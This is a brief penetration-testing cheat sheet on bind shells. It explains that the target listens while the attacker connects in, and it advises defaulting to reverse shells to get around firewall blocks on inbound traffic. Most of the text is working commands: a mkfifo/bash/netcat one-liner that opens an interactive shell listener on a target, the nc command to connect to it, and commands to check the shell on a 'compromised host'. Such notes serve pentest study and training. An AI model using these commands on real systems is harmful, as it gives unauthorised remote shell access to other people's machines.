# Bind Shells

Target listens, you connect inbound. Harder to use through firewalls — incoming connections get blocked. Use when you have internal network access or no egress filtering on target.

Start listener on target with a bash shell piped through nc:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > /tmp/f
```

Connect from attack box:

```bash
nc -nv <TARGET_IP> <PORT>
```

Identify shell on compromised host if needed:

```bash
ps
env | grep SHELL
```

Bind = target listens → you connect in. Reverse = you listen → target connects out. Default to reverse — outbound traffic is trusted, inbound gets blocked.